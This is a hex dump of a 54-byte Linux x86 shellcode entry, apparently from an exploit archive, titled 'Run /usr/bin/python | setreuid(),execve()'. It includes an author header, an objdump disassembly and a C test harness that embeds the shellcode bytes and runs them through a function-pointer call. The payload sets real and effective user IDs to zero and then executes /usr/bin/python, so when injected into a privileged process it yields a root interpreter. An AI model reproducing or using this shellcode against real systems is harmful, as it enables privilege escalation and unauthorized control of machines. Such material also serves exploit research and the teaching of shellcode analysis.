00000000  23 20 54 69 74 6c 65 3a  20 53 68 65 6c 6c 63 6f  |# Title: Shellco|
00000010  64 65 20 4c 69 6e 75 78  20 78 38 36 20 5b 35 34  |de Linux x86 [54|
00000020  42 79 74 65 73 5d 20 52  75 6e 20 2f 75 73 72 2f  |Bytes] Run /usr/|
00000030  62 69 6e 2f 70 79 74 68  6f 6e 20 7c 20 73 65 74  |bin/python | set|
00000040  72 65 75 69 64 28 29 2c  65 78 65 63 76 65 28 29  |reuid(),execve()|
00000050  0a 23 20 44 61 74 65 3a  20 38 2f 35 2f 32 30 31  |.# Date: 8/5/201|
00000060  34 0a 23 20 41 75 74 68  6f 72 3a 20 41 6c 69 20  |4.# Author: Ali |
00000070  52 61 7a 6d 6a 6f 6f 0a  23 20 54 65 73 74 65 64  |Razmjoo.# Tested|
00000080  20 6f 6e 3a 20 6b 61 6c  69 2d 6c 69 6e 75 78 2d  | on: kali-linux-|
00000090  31 2e 30 2e 34 2d 69 33  38 36 20 5b 33 2e 37 2d  |1.0.4-i386 [3.7-|
000000a0  74 72 75 6e 6b 2d 36 38  36 2d 70 61 65 20 23 31  |trunk-686-pae #1|
000000b0  20 53 4d 50 20 44 65 62  69 61 6e 20 33 2e 37 2e  | SMP Debian 3.7.|
000000c0  32 2d 30 2b 6b 61 6c 69  38 20 69 36 38 36 20 47  |2-0+kali8 i686 G|
000000d0  4e 55 2f 4c 69 6e 75 78  20 5d 0a 0a 2f 2a 0a 41  |NU/Linux ]../*.A|
000000e0  6c 69 20 52 61 7a 6d 6a  6f 6f 20 2c 20 41 6c 69  |li Razmjoo , Ali|
000000f0  2e 52 61 7a 6d 6a 6f 6f  31 39 39 34 40 47 6d 61  |.Razmjoo1994@Gma|
00000100  69 6c 2e 43 6f 6d 0a 53  68 65 6c 6c 63 6f 64 65  |il.Com.Shellcode|
00000110  20 4c 69 6e 75 78 20 78  38 36 20 52 75 6e 20 2f  | Linux x86 Run /|
00000120  75 73 72 2f 62 69 6e 2f  70 79 74 68 6f 6e 20 7c  |usr/bin/python ||
00000130  20 73 65 74 72 65 75 69  64 28 29 2c 65 78 65 63  | setreuid(),exec|
00000140  76 65 28 29 0a 53 68 65  6c 6c 63 6f 64 65 20 4c  |ve().Shellcode L|
00000150  65 6e 67 74 68 3a 20 35  34 0a 0a 0a 30 30 30 30  |ength: 54...0000|
00000160  30 30 30 30 20 3c 5f 73  74 61 72 74 3e 3a 0a 20  |0000 <_start>:. |
00000170  20 20 30 3a 20 20 20 33  31 20 63 30 20 20 20 20  |  0:   31 c0    |
00000180  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 78  |               x|
00000190  6f 72 20 20 20 20 25 65  61 78 2c 25 65 61 78 0a  |or    %eax,%eax.|
000001a0  20 20 20 32 3a 20 20 20  62 30 20 34 36 20 20 20  |   2:   b0 46   |
000001b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000001c0  6d 6f 76 20 20 20 20 24  30 78 34 36 2c 25 61 6c  |mov    $0x46,%al|
000001d0  0a 20 20 20 34 3a 20 20  20 33 31 20 64 62 20 20  |.   4:   31 db  |
000001e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000001f0  20 78 6f 72 20 20 20 20  25 65 62 78 2c 25 65 62  | xor    %ebx,%eb|
00000200  78 0a 20 20 20 36 3a 20  20 20 33 31 20 63 39 20  |x.   6:   31 c9 |
00000210  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000220  20 20 78 6f 72 20 20 20  20 25 65 63 78 2c 25 65  |  xor    %ecx,%e|
00000230  63 78 0a 20 20 20 38 3a  20 20 20 63 64 20 38 30  |cx.   8:   cd 80|
00000240  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000250  20 20 20 69 6e 74 20 20  20 20 24 30 78 38 30 0a  |   int    $0x80.|
00000260  20 20 20 61 3a 20 20 20  65 62 20 31 36 20 20 20  |   a:   eb 16   |
00000270  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000280  6a 6d 70 20 20 20 20 32  32 20 3c 6c 61 73 74 3e  |jmp    22 <last>|
00000290  0a 30 30 30 30 30 30 30  63 20 3c 66 69 72 73 74  |.0000000c <first|
000002a0  3e 3a 0a 20 20 20 63 3a  20 20 20 35 62 20 20 20  |>:.   c:   5b   |
000002b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002c0  20 20 20 70 6f 70 20 20  20 20 25 65 62 78 0a 20  |   pop    %ebx. |
000002d0  20 20 64 3a 20 20 20 33  31 20 63 30 20 20 20 20  |  d:   31 c0    |
000002e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 78  |               x|
000002f0  6f 72 20 20 20 20 25 65  61 78 2c 25 65 61 78 0a  |or    %eax,%eax.|
00000300  20 20 20 66 3a 20 20 20  38 38 20 34 33 20 30 66  |   f:   88 43 0f|
00000310  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000320  6d 6f 76 20 20 20 20 25  61 6c 2c 30 78 66 28 25  |mov    %al,0xf(%|
00000330  65 62 78 29 0a 20 20 31  32 3a 20 20 20 38 39 20  |ebx).  12:   89 |
00000340  35 62 20 31 30 20 20 20  20 20 20 20 20 20 20 20  |5b 10           |
00000350  20 20 20 20 20 6d 6f 76  20 20 20 20 25 65 62 78  |     mov    %ebx|
00000360  2c 30 78 31 30 28 25 65  62 78 29 0a 20 20 31 35  |,0x10(%ebx).  15|
00000370  3a 20 20 20 38 39 20 34  33 20 31 34 20 20 20 20  |:   89 43 14    |
00000380  20 20 20 20 20 20 20 20  20 20 20 20 6d 6f 76 20  |            mov |
00000390  20 20 20 25 65 61 78 2c  30 78 31 34 28 25 65 62  |   %eax,0x14(%eb|
000003a0  78 29 0a 20 20 31 38 3a  20 20 20 62 30 20 30 62  |x).  18:   b0 0b|
000003b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000003c0  20 20 20 6d 6f 76 20 20  20 20 24 30 78 62 2c 25  |   mov    $0xb,%|
000003d0  61 6c 0a 20 20 31 61 3a  20 20 20 38 64 20 34 62  |al.  1a:   8d 4b|
000003e0  20 31 30 20 20 20 20 20  20 20 20 20 20 20 20 20  | 10             |
000003f0  20 20 20 6c 65 61 20 20  20 20 30 78 31 30 28 25  |   lea    0x10(%|
00000400  65 62 78 29 2c 25 65 63  78 0a 20 20 31 64 3a 20  |ebx),%ecx.  1d: |
00000410  20 20 38 64 20 35 33 20  31 34 20 20 20 20 20 20  |  8d 53 14      |
00000420  20 20 20 20 20 20 20 20  20 20 6c 65 61 20 20 20  |          lea   |
00000430  20 30 78 31 34 28 25 65  62 78 29 2c 25 65 64 78  | 0x14(%ebx),%edx|
00000440  0a 20 20 32 30 3a 20 20  20 63 64 20 38 30 20 20  |.  20:   cd 80  |
00000450  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000460  20 69 6e 74 20 20 20 20  24 30 78 38 30 0a 30 30  | int    $0x80.00|
00000470  30 30 30 30 32 32 20 3c  6c 61 73 74 3e 3a 0a 20  |000022 <last>:. |
00000480  20 32 32 3a 20 20 20 65  38 20 65 35 20 66 66 20  | 22:   e8 e5 ff |
00000490  66 66 20 66 66 20 20 20  20 20 20 20 20 20 20 63  |ff ff          c|
000004a0  61 6c 6c 20 20 20 63 20  3c 66 69 72 73 74 3e 0a  |all   c <first>.|
000004b0  20 20 32 37 3a 20 20 20  32 66 20 20 20 20 20 20  |  27:   2f      |
000004c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004d0  64 61 73 0a 20 20 32 38  3a 20 20 20 37 35 20 37  |das.  28:   75 7|
000004e0  33 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |3               |
000004f0  20 20 20 20 6a 6e 65 20  20 20 20 39 64 20 3c 6c  |    jne    9d <l|
00000500  61 73 74 2b 30 78 37 62  3e 0a 20 20 32 61 3a 20  |ast+0x7b>.  2a: |
00000510  20 20 37 32 20 32 66 20  20 20 20 20 20 20 20 20  |  72 2f         |
00000520  20 20 20 20 20 20 20 20  20 20 6a 62 20 20 20 20  |          jb    |
00000530  20 35 62 20 3c 6c 61 73  74 2b 30 78 33 39 3e 0a  | 5b <last+0x39>.|
00000540  20 20 32 63 3a 20 20 20  36 32 20 36 39 20 36 65  |  2c:   62 69 6e|
00000550  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000560  62 6f 75 6e 64 20 20 25  65 62 70 2c 30 78 36 65  |bound  %ebp,0x6e|
00000570  28 25 65 63 78 29 0a 20  20 32 66 3a 20 20 20 32  |(%ecx).  2f:   2|
00000580  66 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |f               |
00000590  20 20 20 20 20 20 20 64  61 73 0a 20 20 33 30 3a  |       das.  30:|
000005a0  20 20 20 37 30 20 37 39  20 20 20 20 20 20 20 20  |   70 79        |
000005b0  20 20 20 20 20 20 20 20  20 20 20 6a 6f 20 20 20  |           jo   |
000005c0  20 20 61 62 20 3c 6c 61  73 74 2b 30 78 38 39 3e  |  ab <last+0x89>|
000005d0  0a 20 20 33 32 3a 20 20  20 37 34 20 36 38 20 20  |.  32:   74 68  |
000005e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000005f0  20 6a 65 20 20 20 20 20  39 63 20 3c 6c 61 73 74  | je     9c <last|
00000600  2b 30 78 37 61 3e 0a 20  20 33 34 3a 20 20 20 36  |+0x7a>.  34:   6|
00000610  66 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |f               |
00000620  20 20 20 20 20 20 20 6f  75 74 73 6c 20 20 25 64  |       outsl  %d|
00000630  73 3a 28 25 65 73 69 29  2c 28 25 64 78 29 0a 20  |s:(%esi),(%dx). |
00000640  20 33 35 3a 20 20 20 36  65 20 20 20 20 20 20 20  | 35:   6e       |
00000650  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6f  |               o|
00000660  75 74 73 62 20 20 25 64  73 3a 28 25 65 73 69 29  |utsb  %ds:(%esi)|
00000670  2c 28 25 64 78 29 0a 2a  2f 0a 0a 23 69 6e 63 6c  |,(%dx).*/..#incl|
00000680  75 64 65 20 3c 73 74 64  69 6f 2e 68 3e 0a 23 69  |ude <stdio.h>.#i|
00000690  6e 63 6c 75 64 65 20 3c  73 74 72 69 6e 67 2e 68  |nclude <string.h|
000006a0  3e 0a 0a 63 68 61 72 20  73 63 5b 5d 20 3d 20 22  |>..char sc[] = "|
000006b0  5c 78 33 31 5c 78 63 30  5c 78 62 30 5c 78 34 36  |\x31\xc0\xb0\x46|
000006c0  5c 78 33 31 5c 78 64 62  5c 78 33 31 5c 78 63 39  |\x31\xdb\x31\xc9|
000006d0  5c 78 63 64 5c 78 38 30  5c 78 65 62 5c 78 31 36  |\xcd\x80\xeb\x16|
000006e0  5c 78 35 62 5c 78 33 31  5c 78 63 30 5c 78 38 38  |\x5b\x31\xc0\x88|
000006f0  5c 78 34 33 5c 78 30 66  5c 78 38 39 5c 78 35 62  |\x43\x0f\x89\x5b|
00000700  5c 78 31 30 5c 78 38 39  5c 78 34 33 5c 78 31 34  |\x10\x89\x43\x14|
00000710  5c 78 62 30 5c 78 30 62  5c 78 38 64 5c 78 34 62  |\xb0\x0b\x8d\x4b|
00000720  5c 78 31 30 5c 78 38 64  5c 78 35 33 5c 78 31 34  |\x10\x8d\x53\x14|
00000730  5c 78 63 64 5c 78 38 30  5c 78 65 38 5c 78 65 35  |\xcd\x80\xe8\xe5|
00000740  5c 78 66 66 5c 78 66 66  5c 78 66 66 5c 78 32 66  |\xff\xff\xff\x2f|
00000750  5c 78 37 35 5c 78 37 33  5c 78 37 32 5c 78 32 66  |\x75\x73\x72\x2f|
00000760  5c 78 36 32 5c 78 36 39  5c 78 36 65 5c 78 32 66  |\x62\x69\x6e\x2f|
00000770  5c 78 37 30 5c 78 37 39  5c 78 37 34 5c 78 36 38  |\x70\x79\x74\x68|
00000780  5c 78 36 66 5c 78 36 65  22 3b 0a 0a 69 6e 74 20  |\x6f\x6e";..int |
00000790  6d 61 69 6e 28 76 6f 69  64 29 0a 7b 0a 20 20 20  |main(void).{.   |
000007a0  20 66 70 72 69 6e 74 66  28 73 74 64 6f 75 74 2c  | fprintf(stdout,|
000007b0  22 4c 65 6e 67 74 68 3a  20 25 64 5c 6e 5c 6e 22  |"Length: %d\n\n"|
000007c0  2c 73 74 72 6c 65 6e 28  73 63 29 29 3b 0a 20 20  |,strlen(sc));.  |
000007d0  20 20 28 2a 28 76 6f 69  64 28 2a 29 28 29 29 20  |  (*(void(*)()) |
000007e0  73 63 29 28 29 3b 0a 7d                           |sc)();.}|
000007e8
